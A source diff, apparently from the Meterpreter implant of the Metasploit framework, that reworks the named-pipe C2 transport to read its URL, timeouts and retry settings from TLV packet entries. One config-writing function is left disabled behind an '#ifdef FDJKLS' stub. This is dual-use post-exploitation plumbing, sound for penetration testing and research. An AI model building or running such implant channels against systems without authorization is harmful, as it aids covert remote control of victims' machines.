@@ -183,9 +183,9 @@ static DWORD packet_receive_named_pipe(Remote *remote, Packet **packet)
 #endif
 
 		// if we don't have a GUID yet, we need to take the one given in the packet
-		if (is_null_guid(remote->orig_config->session.session_guid))
+		if (is_null_guid(remote->session_guid))
 		{
-			memcpy(remote->orig_config->session.session_guid, header.session_guid, sizeof(remote->orig_config->session.session_guid));
+			memcpy_s(remote->session_guid, sizeof(remote->session_guid), header.session_guid, sizeof(header.session_guid));
 		}
 
 		payloadLength = ntohl(header.length) - sizeof(TlvHeader);
@@ -638,8 +638,9 @@ static void transport_set_handle_named_pipe(Transport* transport, UINT_PTR handl
  * @param transport Transport data to create the configuration from.
  * @param config Pointer to the config block to write to.
  */
-void transport_write_named_pipe_config(Transport* transport, MetsrvTransportNamedPipe* config)
+void transport_write_named_pipe_config(Transport* transport, Packet* packet, Tlv* configTlv)
 {
+#ifdef FDJKLS
 	if (transport && config)
 	{
 		config->common.comms_timeout = transport->timeouts.comms;
@@ -647,6 +648,7 @@ void transport_write_named_pipe_config(Transport* transport, MetsrvTransportName
 		config->common.retry_wait = transport->timeouts.retry_wait;
 		wcsncpy(config->common.url, transport->url, URL_SIZE);
 	}
+#endif
 }
 
 /*!
@@ -677,41 +679,28 @@ static DWORD get_migrate_context_named_pipe(Transport* transport, DWORD targetPr
 }
 
 /*!
- * @brief Gets the size of the memory space required to store the configuration for this transport.
- * @param t Pointer to the transport.
- * @return Size, in bytes of the required memory block.
- */
-static DWORD transport_get_config_size_named_pipe(Transport* t)
-{
-	return sizeof(MetsrvTransportNamedPipe);
-}
-
-/*!
  * @brief Creates a new named pipe transport instance.
  * @param config The Named Pipe configuration block.
  * @param size Pointer to the size of the parsed config block.
  * @return Pointer to the newly configured/created Named Pipe transport instance.
  */
-Transport* transport_create_named_pipe(MetsrvTransportNamedPipe* config, LPDWORD size)
+Transport* transport_create_named_pipe(Packet* packet, Tlv* c2Tlv)
 {
 	Transport* transport = (Transport*)calloc(1, sizeof(Transport));
 	NamedPipeTransportContext* ctx = (NamedPipeTransportContext*)calloc(1, sizeof(NamedPipeTransportContext));
 
-	if (size)
-	{
-		*size = sizeof(MetsrvTransportNamedPipe);
-	}
-
 	// Lock used to synchronise writes
 	ctx->write_lock = lock_create();
 
-	dprintf("[TRANS NP] Creating pipe transport for url %S", config->common.url);
+	PWSTR url = packet_get_tlv_group_entry_value_wstring(packet, c2Tlv, TLV_TYPE_C2_URL, NULL);
+
+	dprintf("[TRANS NP] Creating pipe transport for url %S", url);
 
 	transport->type = METERPRETER_TRANSPORT_PIPE;
-	transport->timeouts.comms = config->common.comms_timeout;
-	transport->timeouts.retry_total = config->common.retry_total;
-	transport->timeouts.retry_wait = config->common.retry_wait;
-	transport->url = _wcsdup(config->common.url);
+	transport->timeouts.comms = packet_get_tlv_group_entry_value_uint(packet, c2Tlv, TLV_TYPE_C2_COMM_TIMEOUT);
+	transport->timeouts.retry_total = packet_get_tlv_group_entry_value_uint(packet, c2Tlv, TLV_TYPE_C2_RETRY_TOTAL);
+	transport->timeouts.retry_wait = packet_get_tlv_group_entry_value_uint(packet, c2Tlv, TLV_TYPE_C2_RETRY_WAIT);
+	transport->url = url;
 	transport->packet_transmit = packet_transmit_named_pipe;
 	transport->transport_init = configure_named_pipe_connection;
 	transport->transport_destroy = transport_destroy_named_pipe;
@@ -722,7 +711,6 @@ Transport* transport_create_named_pipe(MetsrvTransportNamedPipe* config, LPDWORD
 	transport->ctx = ctx;
 	transport->comms_last_packet = current_unix_timestamp();
 	transport->get_migrate_context = get_migrate_context_named_pipe;
-	transport->get_config_size = transport_get_config_size_named_pipe;
 
 	return transport;
 }
